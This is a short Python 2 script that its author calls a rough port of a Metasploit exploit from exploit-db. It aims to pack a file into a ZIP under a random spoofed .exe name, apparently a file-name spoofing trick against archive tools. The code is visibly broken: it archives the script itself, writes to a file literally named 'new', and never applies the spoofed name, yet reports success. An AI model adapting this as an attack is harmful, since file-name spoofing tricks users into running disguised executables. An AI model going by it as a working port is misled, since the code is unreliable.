import sys
import random
import zipfile

"""
My poor attempt @ porting a msf exploit to python. - http://www.exploit-db.com/exploits/32752/

Run with:
python spoof.py file_to_spoof new_spoofed_filename
"""

file = sys.argv[0]
new = ''.join(random.choice('0123456789abcdefghijklmnopqurstuvwxyz') for i in range(16)) + ".exe"

def spoof_file(file, new):
    zip = zipfile.ZipFile('new', 'w')
    zip.write(file)
    zip.close()
    print "Created file: " + new

spoof_file(file, new)
